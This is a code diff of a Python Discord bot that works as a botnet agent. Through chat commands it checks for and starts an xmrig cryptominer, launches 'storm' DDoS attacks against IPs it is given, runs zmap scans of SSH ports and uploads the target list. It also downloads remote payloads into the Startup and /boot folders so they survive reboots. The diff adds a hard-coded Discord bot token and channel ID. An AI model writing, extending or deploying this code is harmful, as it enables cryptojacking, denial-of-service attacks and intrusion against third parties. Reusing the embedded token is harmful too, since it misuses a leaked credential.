@@ -1,8 +1,8 @@
 from discord.ext import commands
 import requests, platform, discord, urllib, psutil, socket, sys, os
 
-token = 'abc' # Token
-channel_id = 111111111 # Channel ID
+token = 'MTAzNzY3ODY2ODA5ODU4ODY3Mg.GZOFHP.uN2sDeIXq9rey5c6ci6ARKH9JyyiGgE9wWFE1M' # Token
+channel_id = 1045415824346853436  # Channel ID
 
 # bot
 intents = discord.Intents.default()
@@ -20,6 +20,15 @@ else:
     startup = f"{appdata}\Microsoft\Windows\Start Menu\Programs\Startup"
     temp = os.getenv("temp")
     os.chdir(temp)
+
+def checkIfProcessRunning(processName):
+    for proc in psutil.process_iter():
+        try:
+            if processName.lower() in proc.name().lower():
+                return True
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+    return False;
 
 # login
 @bot.event
@@ -43,27 +52,19 @@ async def check(ctx):
     if platform.system() == 'Linux':
         if "xmrig" in (i.name() for i in psutil.process_iter()):
             await ctx.send(f"``[+] {hostname}@{ip}: Miner running``")
-        else:
-            await ctx.send(f"``[-] {hostname}@{ip}: Miner not running``")
         
         if "storm" in (i.name() for i in psutil.process_iter()):
             await ctx.send(f"``[+] {hostname}@{ip}: DDoS running``")
-        else:
-            await ctx.send(f"``[-] {hostname}@{ip}: DDoS not running``")
 
         if "zmap" in (i.name() for i in psutil.process_iter()):
             await ctx.send(f"``[+] {hostname}@{ip}: ZMap running``")
-        else:
-            await ctx.send(f"``[-] {hostname}@{ip}: ZMap not running``")
     else:
         if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
             await ctx.send(f"``[+] {hostname}@{ip}: Miner running``")
-        else:
-            await ctx.send(f"``[-] {hostname}@{ip}: Miner not running``")
     
 # update linux
 @bot.command()
-async def update-linux(ctx, LinuxLinkArg):
+async def updatelinux(ctx, LinuxLinkArg):
     linux_link = ''.join(LinuxLinkArg)
     if platform.system() == 'Linux':
         os.chdir("/boot")
@@ -82,7 +83,7 @@ async def update-linux(ctx, LinuxLinkArg):
     
 # update windows
 @bot.command()
-async def update-windows(ctx, WindowsLinkArg):
+async def updatewindows(ctx, WindowsLinkArg):
     windows_link = ''.join(WindowsLinkArg)
     if platform.system() == 'Windows':
         os.chdir(startup)
@@ -110,7 +111,7 @@ async def ddos(ctx, ddosarg):
             
         ddosip = ''.join(ddosarg)
         os.popen(f"chmod 777 storm; ./storm -d {ddosip}")
-        await ctx.send(f"``[+] {hostname}@{ip}: DDoS started to {ddosip}``")
+        await ctx.send(f"``[+] {hostname}@{ip}: DDoS started``")
     
 # stop ddos
 @bot.command()
@@ -157,29 +158,13 @@ async def stopminer(ctx):
 @bot.command()
 async def zmap(ctx):
     if platform.system() == 'Linux':
-        if not os.path.exists("zmap"):
-            url = "https://github.com/rxu7s/Public/raw/main/zmap"
-            r = requests.get(url, allow_redirects=True)
-            open("zmap", 'wb').write(r.content)
-
-        os.popen("zmap -B 10M -p 22 -n 90 -o iplist.txt")
+        os.popen("apt-get install zmap -y")
+        p = os.popen(f"zmap -B 10M -p 22 -n 100 -o iplist.txt")
         await ctx.send(f"``[+] {hostname}@{ip}: ZMap started``")
 
-# stop zmap
-@bot.command()
-async def stopzmap(ctx):
-    if platform.system() == 'Linux':
-        if "zmap" in (i.name() for i in psutil.process_iter()):
-            os.popen("pkill zmap")
-            await ctx.send(f"``[-] {hostname}@{ip}: ZMap stoped``")
-
-# zmap reports
-@bot.command()
-async def zmapreport(ctx):
-    if platform.system() == 'Linux':
-        if os.path.exists("iplist.txt"):
-            await ctx.send(f"``[+] {hostname}@{ip}: ZMap report``",file=discord.File("iplist.txt"))
-
+        if "whatever" not in p.read():
+            if os.path.exists("iplist.txt"):
+                await ctx.send(f"``[+] {hostname}@{ip}: ZMap report``",file=discord.File("iplist.txt"))
 
 # ----- Self Commands ----- #
 
